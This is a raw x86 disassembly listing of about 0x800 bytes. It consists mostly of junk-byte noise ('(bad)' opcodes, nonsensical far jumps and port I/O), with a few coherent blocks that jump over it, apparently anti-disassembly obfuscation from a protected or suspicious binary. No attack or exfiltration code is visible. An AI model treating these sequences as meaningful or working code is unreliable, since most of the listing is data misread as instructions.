  4104fb:	ret    0xb303
  4104fe:	outs   dx,BYTE PTR ds:[esi]
  4104ff:	dec    edx
  410500:	cs jne 0x4104f3
  410503:	bound  ecx,QWORD PTR [ebp-0xac1528b]
  410509:	add    BYTE PTR [edx],ch
  41050b:	fs je  0x4104c6
  41050e:	fwait
  41050f:	and    BYTE PTR gs:[ecx+ebp*1-0x21],0xc2
  410515:	ret    
  410516:	(bad)  
  410517:	and    BYTE PTR [ebx],ch
  410519:	retf   
  41051a:	(bad)  
  41051b:	cmp    DWORD PTR [ecx+0x4fa7c951],eax
  410521:	jb     0x4104d7
  410523:	clc    
  410524:	icebp  
  410525:	push   0xffffff80
  410527:	jbe    0x41053d
  410529:	jno    0x4104d4
  41052b:	and    DWORD PTR [ecx],esp
  41052d:	aad    0xa8
  41052f:	loop   0x4105ae
  410531:	pop    ebx
  410532:	daa    
  410533:	test   eax,edx
  410535:	sub    BYTE PTR [edx+0x67],al
  410538:	lds    ebp,FWORD PTR [esi-0xf9d4e34]
  41053e:	push   ebx
  41053f:	cdq    
  410540:	jmp    0x6265:0x27867e36
  410547:	dec    ecx
  410548:	push   esi
  410549:	push   ss
  41054a:	sub    BYTE PTR [eax+0x27],al
  41054d:	xchg   ecx,eax
  41054e:	mov    edi,0x5a4cb25e
  410553:	xchg   esi,eax
  410554:	out    dx,al
  410555:	sub    BYTE PTR [edi+0x2629836],dh
  41055b:	sbb    ebp,ebx
  41055d:	push   edi
  41055e:	push   0xffffff90
  410560:	shr    BYTE PTR [edi],0xb
  410563:	mov    ds:0x45969e53,al
  410568:	mov    DWORD PTR ds:0x36e41737,edx
  41056e:	dec    ebx
  41056f:	shl    DWORD PTR [ebp+0x2c93958d],1
  410575:	jle    0x4105a5
  410577:	dec    eax
  410578:	cmp    dl,BYTE PTR [esi-0xcbdc6f9]
  41057e:	pop    esi
  41057f:	shr    BYTE PTR [ebx],1
  410581:	push   es
  410582:	mov    WORD PTR [edi-0x36],?
  410585:	ficom  WORD PTR [ebx]
  410587:	mov    eax,DWORD PTR [ebp-0x10]
  41058a:	mov    edx,DWORD PTR ds:0x4224cc
  410590:	xor    al,0x3b
  410592:	add    al,dl
  410594:	mov    edx,DWORD PTR [ebp-0x14]
  410597:	and    al,0x5d
  410599:	sub    al,dl
  41059b:	mov    edx,DWORD PTR ds:0x4224c8
  4105a1:	imul   dl
  4105a3:	mov    edx,DWORD PTR [ebp+0x8]
  4105a6:	sub    al,0x2d
  4105a8:	cmp    BYTE PTR [edx+ecx*1-0x7bcc],al
  4105af:	jne    0x411184
  4105b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4105b8:	jmp    0x4107f1
  4105bd:	cmp    BYTE PTR [edx+0x62],0x1c
  4105c1:	push   0xdc96b43c
  4105c6:	inc    ebp
  4105c7:	mov    eax,ds:0xad569bfb
  4105cc:	outs   dx,DWORD PTR ds:[esi]
  4105cd:	cmp    DWORD PTR [edi],esi
  4105cf:	mov    ebx,0xbbbfebbb
  4105d4:	mov    ebx,0x59750598
  4105d9:	out    0xdf,eax
  4105db:	dec    edx
  4105dc:	popf   
  4105dd:	loope  0x410640
  4105df:	and    eax,0x1a367198
  4105e4:	sahf   
  4105e5:	sbb    esp,DWORD PTR [esi]
  4105e7:	iretw  
  4105e9:	push   ecx
  4105ea:	add    DWORD PTR [esi],edx
  4105ec:	pop    es
  4105ed:	out    0x6f,al
  4105ef:	aam    0x6c
  4105f1:	mov    esi,0x8226afea
  4105f6:	stc    
  4105f7:	jmp    0x4105d8
  4105f9:	push   ebx
  4105fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105fb:	stos   BYTE PTR es:[edi],al
  4105fc:	dec    ecx
  4105fd:	adc    eax,DWORD PTR [ebp-0x36]
  410600:	and    DWORD PTR [ebx+esi*1-0x5f],eax
  410604:	sbb    al,0xc9
  410606:	mov    bl,0x8a
  410608:	sti    
  410609:	pop    esi
  41060a:	add    bh,BYTE PTR [ebp+0x79dedac7]
  410610:	adc    dl,ah
  410612:	fcomip st,st(1)
  410614:	scas   al,BYTE PTR es:[edi]
  410615:	pop    ebx
  410616:	retf   0x3e48
  410619:	popf   
  41061a:	or     ah,BYTE PTR [bx+di]
  41061d:	test   BYTE PTR [edi],dh
  41061f:	lock xchg esi,eax
  410621:	stos   DWORD PTR es:[edi],eax
  410622:	mov    ebx,0x98e3e77c
  410627:	or     al,0x4d
  410629:	stos   DWORD PTR es:[edi],eax
  41062a:	jle    0x4105fb
  41062c:	loop   0x410625
  41062e:	(bad)  
  41062f:	push   0x97ff8af
  410634:	scas   al,BYTE PTR es:[edi]
  410635:	(bad)  
  410636:	sub    eax,0xb9b04628
  41063b:	inc    ebx
  41063c:	js     0x410610
  41063e:	stos   DWORD PTR es:[edi],eax
  41063f:	mov    DWORD PTR ds:0xbbd5aa9e,edi
  410645:	add    bh,BYTE PTR [ecx]
  410647:	out    0xb2,al
  410649:	out    0xd9,al
  41064b:	into   
  41064c:	add    cl,BYTE PTR [ebp-0x34]
  41064f:	fs leave 
  410651:	xchg   edi,ebx
  410653:	jne    0x410657
  410655:	mov    al,0x78
  410657:	mov    cl,0x31
  410659:	cmp    al,BYTE PTR [edx]
  41065b:	es push edi
  41065d:	and    esi,DWORD PTR [edx+0x51]
  410660:	xchg   ebp,eax
  410661:	and    DWORD PTR [ebp-0x59f1b527],0xffffff85
  410668:	enter  0x89a3,0x53
  41066c:	xchg   edi,eax
  41066d:	jne    0x410678
  41066f:	(bad)  [ebx-0x74]
  410672:	add    cl,al
  410674:	cmp    al,0x1f
  410676:	neg    DWORD PTR [ebx+0x68]
  410679:	shr    BYTE PTR [eax+0x5cc3129a],cl
  41067f:	retf   
  410680:	lods   al,BYTE PTR ds:[esi]
  410681:	jmp    0xf3bf:0xb1e10915
  410688:	outs   dx,DWORD PTR ds:[esi]
  410689:	fwait
  41068a:	jge    0x4106f9
  41068c:	call   0x59e15c4
  410691:	mov    dh,0x2a
  410693:	and    al,BYTE PTR [eax-0xd]
  410696:	leave  
  410697:	div    BYTE PTR [ebx-0x10249bfd]
  41069d:	in     eax,0xf
  41069f:	pusha  
  4106a0:	adc    BYTE PTR [edx-0x6c7e2556],ch
  4106a6:	mov    DWORD PTR [esi+0x76],edi
  4106a9:	mov    al,ds:0x2c5e026a
  4106ae:	inc    esp
  4106af:	xor    BYTE PTR [ebp-0x12],0xb1
  4106b3:	fs or  al,0x64
  4106b6:	(bad)  
  4106b7:	repnz push 0x6e
  4106ba:	push   0xffffffcc
  4106bc:	mov    ebp,0x4c945e11
  4106c1:	sti    
  4106c2:	scas   al,BYTE PTR es:[edi]
  4106c3:	pop    ebx
  4106c4:	sub    al,0xf2
  4106c6:	mov    esi,0x3aa23eab
  4106cb:	mov    WORD PTR [ebx-0x71],?
  4106ce:	adc    eax,esp
  4106d0:	adc    BYTE PTR [edx-0x3fe1f65e],ch
  4106d6:	ror    esp,1
  4106d8:	mov    bh,bl
  4106da:	out    dx,al
  4106db:	xlat   BYTE PTR ds:[ebx]
  4106dc:	fcom   QWORD PTR [eax+0x1a50aa91]
  4106e2:	inc    ecx
  4106e3:	mov    WORD PTR [ecx],es
  4106e5:	cld    
  4106e6:	mov    eax,0xb27dccd
  4106eb:	shl    BYTE PTR [eax],0x26
  4106ee:	pop    ebx
  4106ef:	jns    0x410705
  4106f1:	pop    es
  4106f2:	pushf  
  4106f3:	cmp    BYTE PTR [eax-0x10],bl
  4106f6:	sub    al,0x6d
  4106f8:	pop    edi
  4106f9:	jmp    0xfe9b:0xc3871a9b
  410700:	ror    dl,0x1
  410703:	adc    al,0xd2
  410705:	es hlt 
  410707:	jmp    FWORD PTR [ebx+0x5]
  41070a:	adc    al,dl
  41070c:	retf   0x7076
  41070f:	sbb    DWORD PTR [eax+0x27],ebp
  410712:	add    esp,esp
  410714:	sub    DWORD PTR [ebp-0x269ab01f],0xa291e62b
  41071e:	addr16 mov al,ds:0xea9f
  410722:	mov    DWORD PTR [ebx],0xa82fa01f
  410728:	push   0xffffff9d
  41072a:	add    ch,BYTE PTR [edx]
  41072c:	stos   BYTE PTR es:[edi],al
  41072d:	imul   ebp,DWORD PTR [eax],0xfffffff9
  410730:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410731:	mov    cl,0x6f
  410733:	add    DWORD PTR cs:[ecx],ecx
  410736:	mov    DWORD PTR ds:0x9d6f981c,0x828c2fac
  410740:	or     al,0xcb
  410742:	or     eax,0x936b651a
  410747:	shr    edx,0xaa
  41074a:	outs   dx,DWORD PTR ds:[esi]
  41074b:	lods   al,BYTE PTR ds:[esi]
  41074c:	popf   
  41074d:	add    al,0xcc
  41074f:	cmp    eax,0x51b343c6
  410754:	and    DWORD PTR [edx],edi
  410756:	dec    edx
  410757:	dec    edx
  410758:	adc    cl,bh
  41075a:	add    ah,BYTE PTR [ebp+edi*4-0x52fc6cdd]
  410761:	cmp    ebx,DWORD PTR [esi-0x483a5e1b]
  410767:	outs   dx,BYTE PTR ds:[esi]
  410768:	loop   0x410791
  41076a:	jmp    0x6556:0x4fd618a5
  410771:	xchg   esi,eax
  410772:	loopne 0x4106f6
  410774:	push   ecx
  410775:	fimul  WORD PTR [esi-0x8]
  410778:	in     al,dx
  410779:	push   ebx
  41077a:	add    edx,DWORD PTR [ebx+0x4a]
  41077d:	imul   esi,DWORD PTR [eax-0x6a],0xffffff8e
  410781:	or     BYTE PTR [eax-0x21750e16],cl
  410787:	mov    cs,WORD PTR [ecx]
  410789:	jmp    0x960c:0x9fec477c
  410790:	sbb    DWORD PTR [esp+ebx*2],ebx
  410793:	inc    edi
  410794:	cmp    edx,DWORD PTR [eax+eax*8+0x25bf5f52]
  41079b:	push   ebx
  41079c:	rol    DWORD PTR [edx+edx*2+0x55],0x78
  4107a1:	or     bh,BYTE PTR [eax-0x75]
  4107a4:	lahf   
  4107a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107a6:	into   
  4107a7:	fs aaa 
  4107a9:	jno    0x41075d
  4107ab:	and    al,0xeb
  4107ad:	add    al,0x96
  4107af:	sub    edi,DWORD PTR [ecx-0x39]
  4107b2:	jb     0x410737
  4107b4:	and    esi,ebx
  4107b6:	sbb    cl,bh
  4107b8:	dec    ebp
  4107b9:	jb     0x4107cc
  4107bb:	and    BYTE PTR [ebx],bl
  4107bd:	and    DWORD PTR [esi],ecx
  4107bf:	mov    eax,ds:0x7d899882
  4107c4:	test   BYTE PTR [esi],0xbe
  4107c7:	mov    ecx,0x9ff45e35
  4107cc:	mov    ebx,0x419b46e7
  4107d1:	in     al,0x0
  4107d3:	shr    DWORD PTR [edi+0x78c43782],cl
  4107d9:	mov    cl,0xc5
  4107db:	and    edx,DWORD PTR [ecx+0x67]
  4107de:	xchg   DWORD PTR [eax],esi
  4107e0:	popf   
  4107e1:	sbb    ch,BYTE PTR [ebx]
  4107e3:	fidiv  DWORD PTR ds:0xcad625a7
  4107e9:	call   edx
  4107eb:	shl    BYTE PTR [eax],0x26
  4107ee:	mov    ch,0xa8
  4107f0:	inc    ebp
  4107f1:	mov    eax,DWORD PTR [ebp-0x8]
  4107f4:	jmp    0x410a2d
  4107f9:	fbld   TBYTE PTR [esi]
  4107fb:	rol    DWORD PTR ds:[esi-0x4cc9894e],cl
  410802:	fnstcw WORD PTR [esi-0x563c96c5]
  410808:	outs   dx,DWORD PTR ds:[esi]
  410809:	imul   edi,DWORD PTR [ebx],0xbfebbbbb
  41080f:	mov    ebx,0x5fd4b1bb
  410814:	pop    ecx
  410815:	and    al,ch
  410817:	enter  0x8777,0x3b
  41081b:	mov    eax,ds:0xaf23f375
  410820:	mov    WORD PTR [ecx-0x75],cs
  410823:	xor    bl,ah
  410825:	jle    0x4107f3
  410827:	mov    ebp,0xffc50aff
  41082c:	push   esi
  41082d:	sbb    BYTE PTR [ecx],0x75
  410830:	imul   eax,ebp,0x55c195d8
  410836:	xchg   ecx,eax
  410837:	add    DWORD PTR [ebx+ebx*1],edi
  41083a:	and    BYTE PTR [eax-0x6aaef57c],al
  410840:	lods   eax,DWORD PTR ds:[esi]
  410841:	stos   DWORD PTR es:[edi],eax
  410842:	sbb    BYTE PTR [edi-0x6dc0b679],cl
  410848:	push   ds
  410849:	int3   
  41084a:	push   esp
  41084b:	add    eax,0x8d6dfac1
  410850:	retf   0x32d
  410853:	aam    0xb6
  410855:	lahf   
  410856:	jns    0x410830
  410858:	arpl   dx,bx
  41085a:	adc    bh,BYTE PTR [esi-0x3cd57159]
  410860:	sub    al,0x4e
  410862:	mov    bl,0xa3
  410864:	(bad)  
  410865:	dec    ecx
  410866:	std    
  410867:	dec    esi
  410868:	jg     0x410859
  41086a:	and    eax,0xeadd4fac
  41086f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410870:	jns    0x4107f9
  410872:	out    0x8f,al
  410874:	test   DWORD PTR [esi+eiz*1],ebp
  410877:	push   esi
  410878:	popf   
  410879:	or     DWORD PTR [ecx+0x7b],0x5f7fef12
  410880:	xchg   esi,eax
  410881:	xor    DWORD PTR [esi+0x69],edx
  410884:	cli    
  410885:	add    BYTE PTR [edx-0x6d],bl
  410888:	imul   ebx,DWORD PTR [ebx-0x34b21090],0x44188700
  410892:	adc    al,0x19
  410894:	xor    edx,DWORD PTR [edx-0x6c0183a5]
  41089a:	add    al,0x1c
  41089c:	mov    edi,0x8621074f
  4108a1:	sbb    cl,BYTE PTR [ecx+0x48]
  4108a4:	mov    ?,WORD PTR [ebp+edx*2-0x3f]
  4108a8:	sbb    al,0xc4
  4108aa:	jg     0x410864
  4108ac:	data16 aad 0x8f
  4108af:	int3   
  4108b0:	jp     0x410870
  4108b2:	jmp    0x15ea:0x1401138f
  4108b9:	test   al,0xab
  4108bb:	ss mov edi,0x95cd3f5a
  4108c1:	sub    al,0xe8
  4108c3:	inc    edi
  4108c4:	xchg   esi,eax
  4108c5:	nop
  4108c6:	cmp    al,BYTE PTR [ebp+0x26]
  4108c9:	jo     0x410882
  4108cb:	les    esi,FWORD PTR [eax+0x47]
  4108ce:	or     al,cl
  4108d0:	dec    esp
  4108d1:	fldcw  WORD PTR [esp+ebp*2+0xb]
  4108d5:	xor    BYTE PTR [ebx+0x5f],al
  4108d8:	push   0xffffffbe
  4108da:	not    DWORD PTR [ecx]
  4108dc:	add    ah,BYTE PTR [edx-0x40]
  4108df:	jns    0x410894
  4108e1:	out    dx,al
  4108e2:	daa    
  4108e3:	cmc    
  4108e4:	(bad)  [edi+0x8]
  4108e7:	lock loope 0x4108f3
  4108ea:	cdq    
  4108eb:	push   0x1
  4108ed:	mov    ds:0x6af983d1,eax
  4108f2:	js     0x410959
  4108f4:	or     dl,bl
  4108f6:	retf   0xcdf9
  4108f9:	push   eax
  4108fa:	enter  0x687a,0x4e
  4108fe:	cmp    al,0xc8
  410900:	pop    esi
  410901:	dec    ebp
  410902:	loop   0x41096d
  410904:	add    BYTE PTR ds:0x5da6f337,al
  41090a:	jl     0x41091e
  41090c:	pop    edx
  41090d:	inc    eax
  41090e:	ja     0x4108be
  410910:	pushf  
  410911:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410912:	ins    DWORD PTR es:[edi],dx
  410913:	shl    BYTE PTR [edi],1
  410915:	icebp  
  410916:	out    0xbd,eax
  410918:	ror    BYTE PTR [esi-0x4ea2096f],1
  41091e:	loopne 0x410916
  410920:	dec    ebx
  410921:	sbb    BYTE PTR ds:0xcb36e599,dl
  410927:	aaa    
  410928:	mov    esi,0xc1a94e26
  41092d:	test   BYTE PTR [ebx],cl
  41092f:	jecxz  0x4108d9
  410931:	ja     0x4109ac
  410933:	pop    edx
  410934:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410935:	and    al,0x5b
  410937:	mov    cl,BYTE PTR [edx]
  410939:	loope  0x4108e5
  41093b:	inc    eax
  41093c:	jbe    0x4109b3
  41093e:	push   esi
  41093f:	mov    WORD PTR [edi],?
  410941:	mov    al,0x2f
  410943:	loop   0x410924
  410945:	mov    edi,0x66e1c930
  41094a:	aas    
  41094b:	mov    dl,0xb2
  41094d:	retf   0xe1a4
  410950:	jge    0x410933
  410952:	es leave 
  410954:	(bad)  
  410958:	fcom   DWORD PTR cs:[edx+0x5f]
  41095c:	fistp  DWORD PTR [ebx+esi*4]
  41095f:	neg    BYTE PTR [eax+0x5f]
  410962:	enter  0x282c,0xb3
  410966:	aas    
  410967:	test   al,dh
  410969:	adc    BYTE PTR [ebx],al
  41096b:	jmp    DWORD PTR [edx]
  41096d:	sbb    eax,0x8cb0df2e
  410972:	imul   ebp,DWORD PTR [esi],0x4a08dac1
  410978:	cmc    
  410979:	call   0xbdd:0x6e6d1b0
  410980:	inc    edi
  410981:	fmulp  st(4),st
  410983:	aas    
  410984:	adc    BYTE PTR [ecx],cl
  410986:	loop   0x41097f
  410988:	jb     0x41099a
  41098a:	sbb    bl,BYTE PTR [edi]
  41098c:	sbb    DWORD PTR [eax+0x18],0x4
  410990:	loopne 0x4109dd
  410992:	mov    cl,0x2f
  410994:	jnp    0x41095d
  410996:	js     0x4109df
  410998:	adc    cl,cl
  41099a:	ficomp WORD PTR [eax-0x1]
  41099d:	push   DWORD PTR [eax-0x1c]
  4109a0:	scas   eax,DWORD PTR es:[edi]
  4109a1:	lods   al,BYTE PTR ds:[esi]
  4109a2:	aas    
  4109a3:	pop    ecx
  4109a4:	loope  0x41093f
  4109a6:	jmp    0x5febd309
  4109ab:	add    DWORD PTR ds:0xa97db915,ebp
  4109b1:	sti    
  4109b2:	sbb    DWORD PTR [edx],ebp
  4109b4:	ret    
  4109b5:	xor    eax,edx
  4109b7:	adc    DWORD PTR [esi-0x4e657a6d],edx
  4109bd:	jge    0x410a09
  4109bf:	xor    BYTE PTR [eax],dl
  4109c1:	fisubr WORD PTR [edi+0xb]
  4109c4:	(bad)  
  4109c5:	xor    bh,ah
  4109c7:	mov    eax,0x7634b977
  4109cc:	pop    ebx
  4109cd:	mov    WORD PTR [ebx+ecx*1],cs
  4109d0:	fs sbb dh,ah
  4109d3:	pop    ss
  4109d4:	fs sbb eax,0xd5a779
  4109da:	sbb    DWORD PTR [edx+0x3d42d732],ebp
  4109e0:	sbb    eax,0xd52652b4
  4109e5:	push   esp
  4109e6:	gs cdq 
  4109e8:	rcl    BYTE PTR [esi-0x20],cl
  4109eb:	shl    DWORD PTR [ebp+0x69c72fa9],0xe5
  4109f2:	mov    WORD PTR [ebp-0x1c96acf2],ss
  4109f8:	push   ds
  4109f9:	cmc    
  4109fa:	xor    cl,dl
  4109fc:	xor    BYTE PTR [edx-0x37585c9f],cl
  410a02:	sub    al,0x69
  410a04:	outs   dx,DWORD PTR ds:[esi]
  410a05:	mov    ch,0x5
  410a07:	ud2    
  410a09:	ins    DWORD PTR es:[edi],dx
  410a0a:	scas   eax,DWORD PTR es:[edi]
  410a0b:	mov    ch,0x32
  410a0d:	pop    es
  410a0e:	mov    eax,ds:0x15c1625
  410a13:	mul    DWORD PTR ds:0x7f2c7d84
  410a19:	jecxz  0x410a36
  410a1b:	add    al,0x58
  410a1d:	loope  0x4109ec
  410a1f:	sub    ch,BYTE PTR [ebx+0x6d]
  410a22:	lea    eax,[ebx]
  410a24:	jp     0x4109a7
  410a26:	mov    eax,0xe197be10
  410a2b:	adc    al,0xc3
  410a2d:	and    ecx,eax
  410a2f:	mov    eax,DWORD PTR [ebp-0xc]
  410a32:	or     ecx,eax
  410a34:	mov    eax,ds:0x4224d0
  410a39:	mov    edx,DWORD PTR [ebp-0x4]
  410a3c:	imul   ecx,eax
  410a3f:	push   esi
  410a40:	jmp    0x410c79
  410a45:	dec    esi
  410a46:	call   0xa8af:0x9dbd9c7d
  410a4d:	cmp    al,0x3
  410a4f:	xchg   ebx,eax
  410a50:	outs   dx,DWORD PTR ds:[esi]
  410a51:	push   ecx
  410a52:	popa   
  410a53:	adc    eax,0xbb3f9931
  410a58:	mov    ebx,0xbbbbbfeb
  410a5d:	retf   0x117d
  410a60:	cmp    dh,BYTE PTR [eax]
  410a62:	xor    DWORD PTR ds:0xd2d037db,ecx
  410a68:	das    
  410a69:	outs   dx,DWORD PTR ds:[esi]
  410a6a:	mov    edx,0x3bd2bbb2
  410a6f:	xor    BYTE PTR [eax],0xd2
  410a72:	jl     0x410a2a
  410a74:	push   edx
  410a75:	sti    
  410a76:	daa    
  410a77:	(bad)  
  410a78:	lods   eax,DWORD PTR ds:[esi]
  410a79:	fnsave [ecx+ebp*4]
  410a7c:	inc    edx
  410a7d:	mov    ah,0x31
  410a7f:	aad    0xa5
  410a81:	or     al,0x76
  410a83:	in     al,0x18
  410a85:	test   eax,0x92e79cff
  410a8a:	add    al,0x8c
  410a8c:	push   esp
  410a8d:	jo     0x410a5e
  410a8f:	xchg   ecx,eax
  410a90:	mov    ds:0x2c03c309,eax
  410a95:	or     esp,DWORD PTR [ebp+0x9]
  410a98:	mov    eax,ds:0x7ec028bd
  410a9d:	(bad)  
  410a9e:	xchg   ecx,eax
  410a9f:	js     0x410af0
  410aa1:	retf   
  410aa2:	xor    al,0x29
  410aa4:	mov    bl,0x70
  410aa6:	add    dl,ch
  410aa8:	(bad)  
  410aaa:	xchg   edi,eax
  410aab:	add    BYTE PTR [esi-0x7fcf416a],dl
  410ab1:	inc    edx
  410ab2:	mov    ah,0xee
  410ab4:	rcr    DWORD PTR [eax+0x10],0x5a
  410ab8:	xor    eax,0x4c89f44f
  410abd:	or     eax,0xd96b58cd
  410ac2:	cmc    
  410ac3:	imul   eax,ebp,0xeb40f3bb
  410ac9:	lds    ebp,FWORD PTR [esi-0x6]
  410acc:	push   esi
  410acd:	ja     0x410a58
  410acf:	enter  0xbed3,0x7d
  410ad3:	push   esp
  410ad4:	or     al,0xfc
  410ad6:	push   ebp
  410ad7:	mov    ds:0xe38af43a,al
  410adc:	mov    esi,0x25510600
  410ae1:	in     al,dx
  410ae2:	retf   0x9dd9
  410ae5:	mov    DWORD PTR [edx],ecx
  410ae7:	mov    ch,0x39
  410ae9:	(bad)  
  410aea:	lods   eax,DWORD PTR ds:[esi]
  410aeb:	dec    eax
  410aec:	daa    
  410aed:	and    BYTE PTR [edi],ch
  410aef:	out    dx,al
  410af0:	push   esi
  410af1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410af2:	ficomp WORD PTR [ecx]
  410af4:	pop    ecx
  410af5:	jmp    0xc66c:0xe06b89c3
  410afc:	dec    edi
  410afd:	cwde   
  410afe:	stc    
  410aff:	ret    
  410b00:	fsubr  QWORD PTR [ebx+0x3f425494]
  410b06:	mov    al,0x7f
  410b08:	dec    esi
  410b09:	or     ebx,0x77
  410b0c:	sbb    dh,BYTE PTR [ebx+0x46ba30cc]
  410b12:	test   al,0xbe
  410b14:	mov    eax,ds:0x36f227d5
  410b19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b1a:	test   eax,0x73e834da
  410b1f:	jb     0x410abe
  410b21:	mov    WORD PTR [edx+0x14],?
  410b24:	in     al,0x85
  410b26:	(bad)  
  410b27:	scas   al,BYTE PTR es:[edi]
  410b28:	arpl   WORD PTR ds:[ecx+0x30],dx
  410b2c:	repz scas eax,DWORD PTR es:[edi]
  410b2e:	inc    edi
  410b2f:	mov    edx,0xfb7639a1
  410b34:	jne    0x410b7b
  410b36:	movq   mm4,QWORD PTR [esi]
  410b39:	dec    ecx
  410b3a:	mov    ds,edi
  410b3c:	xor    DWORD PTR [esi],esi
  410b3e:	test   DWORD PTR [eax],esi
  410b40:	xchg   ecx,eax
  410b41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b42:	inc    esi
  410b43:	data16 daa 
  410b45:	enter  0x727b,0xda
  410b49:	in     eax,0xff
  410b4b:	sbb    ch,cl
  410b4d:	cdq    
  410b4e:	das    
  410b4f:	mov    eax,ds:0x81aa9b0
  410b54:	mov    ch,0xb4
  410b56:	dec    ebx
  410b57:	sub    DWORD PTR [esi],ebx
  410b59:	xchg   ecx,eax
  410b5a:	pop    eax
  410b5b:	fadd   DWORD PTR [edx+ebp*1]
  410b5e:	imul   eax,DWORD PTR [edi],0x14
  410b61:	call   DWORD PTR [eax]
  410b63:	aaa    
  410b64:	into   
  410b65:	mov    al,0x53
  410b67:	test   DWORD PTR [edx+0x69978c3],ebp
  410b6d:	ror    DWORD PTR [ebx],1
  410b6f:	mov    dl,0x64
  410b71:	jns    0x410b43
  410b73:	add    al,0xc7
  410b75:	into   
  410b76:	push   ds
  410b77:	out    0xf,al
  410b79:	cld    
  410b7a:	inc    esi
  410b7b:	push   cs
  410b7c:	inc    esp
  410b7d:	outs   dx,DWORD PTR ds:[esi]
  410b7e:	in     eax,0xe1
  410b80:	imul   esp,DWORD PTR [edi-0x42],0x52
  410b84:	pop    edx
  410b85:	leave  
  410b86:	ins    BYTE PTR es:[edi],dx
  410b87:	mov    ebp,0xa1e9ce66
  410b8c:	adc    DWORD PTR [ebp+0x52d643c7],ecx
  410b92:	(bad)  
  410b94:	mov    dh,0x80
  410b96:	das    
  410b97:	fnstcw WORD PTR [esi+0x96b5c78]
  410b9d:	jnp    0x410ba8
  410b9f:	fs cmp cl,ch
  410ba2:	mov    al,ds:0x584b885
  410ba7:	nop
  410ba8:	jmp    0x367e06f1
  410bad:	inc    edi
  410bae:	fsub   st(2),st
  410bb0:	(bad)  
  410bb1:	sub    esp,DWORD PTR [esi-0x25c113a3]
  410bb7:	inc    ecx
  410bb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bb9:	ror    BYTE PTR [ecx-0x783ef6d6],0x52
  410bc0:	cmp    eax,edx
  410bc2:	cmp    esp,DWORD PTR [eax+0x7dc16e3c]
  410bc8:	mov    BYTE PTR [esi-0x30df0ce6],ch
  410bce:	icebp  
  410bcf:	ret    0x46eb
  410bd2:	xchg   edx,eax
  410bd3:	sub    eax,0xa2c7d355
  410bd8:	xchg   esp,eax
  410bd9:	repz je 0x410b68
  410bdc:	not    BYTE PTR [eax-0x48]
  410bdf:	aaa    
  410be0:	ja     0x410bd3
  410be2:	mov    ebp,0x6527b3d3
  410be7:	cld    
  410be8:	add    dl,0x2e
  410beb:	jmp    0x82e7951c
  410bf0:	pop    esp
  410bf1:	cmp    dl,cl
  410bf3:	in     al,dx
  410bf4:	xlat   BYTE PTR ds:[ebx]
  410bf5:	in     eax,dx
  410bf6:	lea    eax,cs:[esi-0x79]
  410bfa:	aas    
  410bfb:	(bad)  
  410bfc:	xor    eax,DWORD PTR [ecx-0x7d3a5c15]
  410c02:	or     edi,DWORD PTR [ebp+edx*4-0x25]
  410c06:	xchg   esi,eax
  410c07:	retf   
  410c08:	test   BYTE PTR [esi+0x7f],bh
  410c0b:	dec    eax
  410c0c:	push   ds
  410c0d:	shl    eax,0x80
  410c10:	sub    BYTE PTR [esi],dl
  410c12:	mov    BYTE PTR [ebp+edi*8+0x3e5d97bf],0xa7
  410c1a:	push   edi
  410c1b:	js     0x410c96
  410c1d:	push   esp
  410c1e:	xchg   esp,eax
  410c1f:	pop    ebp
  410c20:	ret    
  410c21:	hlt    
  410c22:	aam    0x61
  410c24:	retf   
  410c25:	(bad)  
  410c26:	pop    edx
  410c27:	mov    BYTE PTR [edx],0x1f
  410c2a:	jne    0x410bf1
  410c2c:	or     ebx,DWORD PTR [esi+0x43fa64ca]
  410c32:	adc    DWORD PTR [eax+esi*8-0x22cf8a38],esi
  410c39:	jae    0x410bc6
  410c3b:	out    0x6,al
  410c3d:	jle    0x410c3b
  410c3f:	push   ebp
  410c40:	push   es
  410c41:	ins    DWORD PTR es:[edi],dx
  410c42:	push   edi
  410c43:	cmp    edi,ecx
  410c45:	jp     0x410cc1
  410c47:	sub    bl,al
  410c49:	je     0x410ca9
  410c4b:	ins    DWORD PTR es:[edi],dx
  410c4c:	mov    DWORD PTR [ecx],ebx
  410c4e:	mov    DWORD PTR [bp-0x27],esp
  410c52:	or     BYTE PTR [esi+0x1d],dh
  410c55:	aas    
  410c56:	into   
  410c57:	pushf  
  410c58:	call   0xe0c0:0x657a289f
  410c5f:	xchg   ebp,eax
  410c60:	inc    esp
  410c61:	addr16 sbb eax,0xe4579f63
  410c67:	inc    edi
  410c68:	loopne 0x410c89
  410c6a:	lock cdq 
  410c6c:	mov    eax,ds:0xf1841e7b
  410c71:	test   edi,0x18fef18b
  410c77:	aam    0x9e
  410c79:	mov    esi,DWORD PTR [ebp-0x8]
  410c7c:	and    edx,esi
  410c7e:	mov    esi,DWORD PTR [ebp-0xc]
  410c81:	or     edx,esi
  410c83:	mov    esi,DWORD PTR ds:0x4224d0
  410c89:	imul   edx,esi
  410c8c:	mov    eax,0xa8a
  410c91:	and    ecx,eax
  410c93:	and    edx,eax
  410c95:	mov    eax,DWORD PTR [ebp+0x8]
  410c98:	shl    ecx,0x6
  410c9b:	mov    eax,DWORD PTR [eax+ecx*1-0x20244]
  410ca2:	jmp    0x410edb
  410ca7:	fstp   DWORD PTR cs:[edx+0x25]
  410cab:	lods   al,BYTE PTR ds:[esi]
  410cac:	mov    ebp,0xc2d6d8b5
  410cb1:	repz das 
  410cb3:	pop    ebx
  410cb4:	aam    0xc2
  410cb6:	das    
  410cb7:	leave  
  410cb8:	dec    ecx
  410cb9:	mov    ebx,0xbbbfebbb
  410cbe:	mov    ebx,0x52e32d93
  410cc3:	sub    DWORD PTR [eiz*1-0x192a2163],esi
  410cca:	sub    ch,bh
  410ccc:	jns    0x410cdc
  410cce:	xor    ebx,eax
  410cd0:	(bad)  
  410cd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cd2:	mov    BYTE PTR [edx+0x9c4c892],al
  410cd8:	outs   dx,BYTE PTR ds:[esi]
